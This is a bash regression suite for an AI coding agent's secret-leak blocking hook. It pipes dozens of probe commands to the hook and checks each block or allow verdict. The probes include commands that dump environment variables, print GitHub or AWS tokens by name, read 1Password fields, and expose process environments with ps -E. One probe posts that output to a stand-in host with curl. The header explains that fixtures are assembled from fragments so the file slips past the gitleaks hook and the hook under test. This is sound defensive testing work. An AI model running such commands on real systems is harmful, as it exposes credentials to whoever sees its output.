#!/bin/bash
# shellcheck disable=SC2016,SC2088
# ^ probe payloads are LITERAL command strings handed to the hook verbatim, so
#   $(...), backticks and ~ must stay unexpanded here rather than be "fixed".
# Regression suite for ~/.claude/hooks/block-secret-echo.sh, everything except
# the shell-profile and env-file rules, which live in envrule.sh beside it.
#
# Run both after ANY edit to the hook:
#     ./hook-suite.sh && ./envrule.sh
#
# NO LITERAL THAT ANY DETECTOR HERE WOULD FLAG APPEARS IN THIS FILE, and the
# keyword and its value are never adjacent in the source. That is the narrow
# claim and it is the true one: a bare value like a passphrase does appear,
# but nothing here matches gitleaks or the hooks under test. Every fixture is assembled
# at runtime from fragments. Written plainly, this file is blocked on write by
# the gitleaks PostToolUse hook, and several cases are blocked on execution by
# the very hook under test, since a command carrying an example trips the rule
# the example demonstrates. Assembling keeps the source clean while the payload
# handed to the hook still contains the whole string.
#
# Exit 0 = all cases behave. Exit 1 = at least one does not.

set -euo pipefail

HOOK="${1:-$HOME/.claude/hooks/block-secret-echo.sh}"
[ -x "$HOOK" ] || { echo "not executable: $HOOK" >&2; exit 2; }
command -v python3 >/dev/null || { echo "python3 required" >&2; exit 2; }

pass=0; fail=0

# $1 label  $2 want(block|allow)  $3 command  [$4 extra json fields]
# EVERY STATUS IS CLASSIFIED. 0 is allow, 2 is block, anything else is an ERROR
# and fails the case whatever was expected. Mapping "not 2" to allow looked
# harmless and was not: measured against a hook that exits 1 on every call, and
# again against one that is not a valid script at all, eleven allow cases PASSED.
# They were satisfied by the hook failing, not by it behaving. A hook that broke
# on only some inputs would pass those cases silently.
probe() {
  local want="$2" cmd="$3" extra="${4:-}" got rc json
  json=$(CMD="$cmd" EXTRA="$extra" python3 -c '
import json, os
ti = {"command": os.environ["CMD"]}
if os.environ["EXTRA"]:
    ti.update(json.loads(os.environ["EXTRA"]))
print(json.dumps({"tool_input": ti}))') || {
    fail=$((fail+1)); printf '  FAIL  %-46s could not build the payload\n' "$1"; return 0; }
  # errexit-safe: `cmd; rc=$?` dies under set -e before the assignment runs, and
  # a non-zero status is the ORDINARY answer here rather than an edge.
  if printf '%s' "$json" | "$HOOK" >/dev/null 2>&1; then rc=0; else rc=$?; fi
  case "$rc" in
    0) got=allow ;;
    2) got=block ;;
    *) fail=$((fail+1)); printf '  FAIL  %-46s hook exited %s (neither allow nor block)\n' "$1" "$rc"; return 0 ;;
  esac
  if [ "$got" = "$want" ]; then
    pass=$((pass+1)); printf '  ok    %-46s %s\n' "$1" "$got"
  else
    fail=$((fail+1)); printf '  FAIL  %-46s %s (want %s)\n' "$1" "$got" "$want"
  fi
}

# Fragments. Nothing below is a real credential.
D='$'; LB='{'; RB='}'; BANG='!'
TOKNAME="GITHUB""_TOKEN"
LEAK="echo \"${D}${LB}${TOKNAME}:-UNSET${RB}\""
BASH_IND="v=${TOKNAME}; echo \"${D}${LB}${BANG}v${RB}\""
ZSH_IND="v=${TOKNAME}; echo ${D}${LB}(P)v${RB}"
LOWER="echo ${D}gh_""token"
LOWKEY="echo ${D}api_""key"
AWSVAR="echo ${D}AWS_""SECRET_ACCESS_KEY"
OPREAD="op read op:/""/vault/item/field"
OPPIPE="op read op:/""/vault/item/field | shasum -a 256"

echo "== the incident that prompted the hook =="
probe "the original leak probe"        block "$LEAK"

echo
echo "== name-indirection, both shells =="
probe "bash indirection"               block "$BASH_IND"
probe "zsh indirection"                block "$ZSH_IND"

echo
echo "== expanding a secret-shaped variable =="
probe "uppercase name"                 block "$AWSVAR"
probe "lowercase token name"           block "$LOWER"
probe "lowercase key name"             block "$LOWKEY"

echo
echo "== printing a secret by name, without expanding =="
probe "printenv NAME"                  block "printenv $TOKNAME"
probe "printenv NAME by absolute path" block "/usr/bin/printenv $TOKNAME"
probe "value-flag then print-by-name"  block "sudo -u root printenv $TOKNAME"
probe "declare -p NAME"                block "declare -p $TOKNAME"
probe "export -p NAME"                 block "export -p $TOKNAME"
probe "typeset -p NAME"                block "typeset -p $TOKNAME"
probe "redirected printenv is allowed" allow "printenv $TOKNAME >/dev/null"
probe "printenv mid-path, real reader" allow "cat /etc/printenv.conf"

echo
echo "== whole-environment dumps =="
probe "bare env"                       block "env"
probe "bare set"                       block "set"
probe "bare export -p"                 block "export -p"
probe "env dump by absolute path"      block "/usr/bin/env"
probe "sudo env still dumps"           block "sudo env"
probe "printenv with a safe name"      allow "printenv PATH"
# command position: a verb sitting in a path ARGUMENT is not a dump. These all
# over-blocked when rule 4 added `/` to a flat leading-delimiter class; fixed by
# routing through at_cmd_pos (only a command-position verb counts).
probe "env as a relative path arg"     allow "ls ./env"
probe "env deep in a path arg"         allow "cd /path/to/env"
probe "env as last path component"     allow "rm -rf /tmp/proj/env"
probe "set as a path arg"              allow "chmod +x /tmp/bin/set"
probe "dir literally named env"        allow "mkdir env"
probe "list a dir named env"           allow "ls env"
probe "env as a command prefix"        allow "env FOO=bar make"
# strict command position: a prefix word (sudo/timeout/xargs) or a loop keyword
# earlier in the statement must NOT drag a mid-path verb into a block when a real
# command sits between them. These over-blocked when 2b/3/4 first shared rule 6's
# loose any()-clause; fixed by the strict walk (verb must be the first real token).
probe "sudo then a real command"       allow "sudo ls ./env"
probe "prefix with an arg, real cmd"   allow "timeout 5 ls ./env"
probe "loop keyword then real cmd"     allow "for x in 1; do ls ./env; done"
probe "xargs then a real command"      allow "echo 1 | xargs ls ./env"
# value-taking options separate their argument, and durations carry a unit. The
# strict walk must consume both, or a real dump behind `sudo -u root` / `timeout
# 5s` reads as "the argument is a command, so the verb is not" and fails OPEN.
# The consume-next list is scoped to value-flags: a NO-argument flag (sudo -i)
# must still leave the next token as the real command.
probe "value-flag then env dump"       block "sudo -u root env"
probe "duration with a unit"           block "timeout 5s env"
probe "fractional duration"            block "timeout 0.5 env"
probe "value-flag with a word arg"     block "timeout -s KILL 5 env"
probe "no-arg flag leaves the command" allow "sudo -i ls ./env"
# per-PREFIX option grammar: the same flag differs by command. -E/-s/-k take NO
# argument for sudo (preserve-env / shell / invalidate-timestamp) but DO for
# xargs/timeout, so the table is keyed by prefix, not by flag alone.
probe "sudo -E takes no argument"      allow "sudo -E ls ./env"
probe "sudo -s takes no argument"      allow "sudo -s ls ./env"
probe "xargs -E DOES take an argument" block "xargs -E eof env"
probe "time -a is a no-arg flag"       allow "time -a ls ./env"
# OPTIONAL-ARITY floor: sudo -h / xargs -i / xargs -e take an argument or not
# depending on the NEXT token, which no (prefix,flag) table can decide. They are
# listed as value-taking so the value form cannot fail open; the cost is over-
# blocking the bare form. Both behaviours are pinned so a future edit changes them
# knowingly rather than reintroducing the fail-open.
probe "sudo -h with a host value"      block "sudo -h host env"
probe "sudo -h bare over-blocks (ok)"  block "sudo -h ls ./env"

echo
echo "== 1Password output must be consumed =="
probe "op read unpiped"                block "$OPREAD"
probe "op read piped to a digest"      allow "$OPPIPE"

echo
echo "== ps environment dumps must be consumed (macOS: -E, -e, -ef, bare e) =="
probe "ps -E"                          block "ps -E"
probe "ps -E with -p"                  block "ps -E -p 12345"
probe "ps -E not the first flag"       block "ps -p 12345 -E"
probe "ps -e shows env on macOS"       block "ps -e"
probe "ps -ef shows env on macOS"      block "ps -ef"
probe "ps bare e bundle"               block "ps eww"
probe "ps auxe bundle"                 block "ps auxe"
probe "ps -ef | grep prints env lines" block "ps -ef | grep foo"
probe "ps -E piped to a count"         allow "ps -E -p 12345 | grep -c FOO"
probe "ps -E redirected"               allow "ps -E -p 12345 >/dev/null"
probe "ps aux has no env"              allow "ps aux"
probe "ps -A -o format has no env"     allow "ps -A -o pid,command"
probe "grep -E is not ps -E"           allow "grep -E pattern file"
probe "sed -e is not ps -e"            allow "sed -e s/a/b/ file"

echo
echo "== ps: adversarial shapes a per-segment grep missed =="
probe "assignment-prefixed sh -c (the incident)"     block 'TESTVAR2=canary sh -c "ps -E -p $$"'
probe "sh -c wrapper piped to a count (house probe)" allow 'CANARY=x sh -c "ps -E -p $$" | grep -c CANARY'
probe "sudo prefix"                    block "sudo ps -E"
probe "absolute path"                  block "/bin/ps -E"
probe "subshell"                       block "(ps -E)"
probe "loop body"                      block "for x in 1; do ps -E; done"
probe "compound, consumer elsewhere"   block "echo hi > /dev/null; ps -E"
probe "compound, capture elsewhere"    block 'ls $(pwd); ps -E'
probe "ps first, count in next stmt"   block "ps -E; echo a | grep -c b"
probe "write to a real file, not consumed" block "ps -E > /tmp/dump.txt"
probe "ps aux then grep -E is not ps -E"   allow "ps aux | grep -E foo"

echo
echo "== ps: round-2 review shapes (newline, capture, arg-position, tee) =="
probe "newline separator, consumer above"  block $'echo hi > /dev/null\nps -E'
probe "newline separator, count above"     block $'echo a | grep -c b\nps -E'
probe "substitution as an arg, not capture" block 'ps -E -p $(echo $$)'
probe "capture of ps is consumption"       allow 'x=$(ps -E -p $$)'
probe "ps in argument position (git add)"  allow "git add ps state"
probe "ps in a path argument (cat)"        allow "cat docs/ps notes"
probe "ps in argument position (rm)"       allow "rm ps cache"
probe "tee leaks despite downstream count" block "ps -E | tee /tmp/x | grep -c foo"
probe "bare bundle inside sh -c wrapper"   block "sh -c 'ps eww'"

echo
echo "== ps: round-3 review shapes (path, print-vs-store, stdout redirect, arg) =="
probe "bare bundle by absolute path"       block "/bin/ps eww"
probe "bare bundle by full path"           block "/usr/bin/ps auxe"
probe "sudo then absolute-path bundle"     block "sudo /bin/ps eww"
probe "captured then printed (echo)"       block 'echo $(ps -E)'
probe "captured then printed (printf)"     block 'printf "%s" $(ps eww)'
probe "stdout to file, stderr to devnull"  block "ps -E > /tmp/x 2>/dev/null"
probe "stdout to devnull, no space"        allow "ps -E >/dev/null"
probe "find -name ps -exec is not ps"      allow "find . -name ps -exec cat {} +"
probe "find -name ps -delete is not ps"    allow "find . -name ps -delete"
probe "grep ps -e is not ps -e"            allow "grep ps -e foo file"

echo
echo "== ps: round-4 review shapes (anchored capture, &>, command vocabulary) =="
probe "unanchored assignment (echo x=)"    block 'echo x=$(ps -E)'
probe "unanchored assignment (curl -d)"    block 'curl -d x=$(ps -E) http://h'
probe "unanchored assignment (printf k=)"  block 'printf "%s" k=$(ps eww)'
probe "export assignment is a store"       allow 'export X=$(ps -E -p $$)'
probe "and-redirect both to devnull"       allow "ps -E &>/dev/null"
probe "xargs execs ps"                     block "echo 1 | xargs ps -E"
probe "if opens a command"                 block "if ps -E; then echo hi; fi"
probe "while opens a command"              block "while ps -E; do :; done"

echo
echo "== ps: round-5 review shapes (prefix-with-args, backtick terminator) =="
probe "timeout with a duration arg"        block "timeout 5 ps -E"
probe "sudo with a -u arg"                  block "sudo -u root ps -E"
probe "xargs with a flag"                   block "echo 1 | xargs -0 ps -E"
probe "nice with a -n arg"                  block "nice -n 5 ps -E"
probe "stdbuf with a flag"                  block "stdbuf -o0 ps -E"
probe "timeout, zero-arg control"          block "timeout ps -E"
probe "backtick capture, printed"          block 'echo `ps -E`'

echo
echo "== fails closed when it cannot read its input =="
# ERREXIT-SAFE. `cmd; [ $? -eq 2 ]` dies under set -e before the test is read,
# which is the same hazard these suites exist to catch. The `if` makes the status
# tested, which suspends errexit.
raw_probe() {  # $1 label  $2 payload
  local rc
  if printf '%s' "$2" | "$HOOK" >/dev/null 2>&1; then rc=0; else rc=$?; fi
  if [ "$rc" -eq 2 ]; then
    pass=$((pass+1)); printf '  ok    %-46s block\n' "$1"
  else
    fail=$((fail+1)); printf '  FAIL  %-46s exited %s (want block)\n' "$1" "$rc"
  fi
}
raw_probe "unreadable payload" 'not json'
raw_probe "empty stdin" ''
probe "valid json carrying no fields"  allow ""

echo
echo "== ordinary work must NOT be blocked =="
probe "grep for a name in source"      allow "grep -rn TOKEN src/"
probe "list the hooks directory"       allow "ls ~/.claude/hooks"
probe "echo a safe variable"           allow "echo ${D}HOME"
probe "git status"                     allow "git status"
probe "git log with a format"          allow "git log --format=%h"
probe "prose naming a variable"        allow "echo 'set your API_TOKEN in the UI'"
probe "a plain build command"          allow "make test"

echo
# The summary carries the RAN count, so a short run cannot be read as success
# by anything that greps only for failed=0. The exit status is authoritative
# either way, but the line above it should not contradict it.
ran=$((pass + fail))
# ONE source for the expected count. The summary used to interpolate the number
# directly while the guard read EXPECTED, so updating only EXPECTED left the
# summary printing a stale denominator. That is the same count-drift this
# guard exists to catch, introduced by the commit that added the guard.
EXPECTED=113
printf '  passed=%s failed=%s ran=%s/%s\n' "$pass" "$fail" "$ran" "$EXPECTED"

# COMPLETENESS GUARD. A case that never runs is not a case that passed, and
# without this the two are the same output. A sibling suite silently skipped
# seven cases under bash 3.2 and still printed "failed=0". Update EXPECTED
# deliberately when adding a case.
if [ "$ran" -ne "$EXPECTED" ]; then
  printf '  INCOMPLETE: ran %s of %s cases. A skipped case is not a passing one.\n' "$ran" "$EXPECTED"
  exit 1
fi

[ "$fail" -eq 0 ]
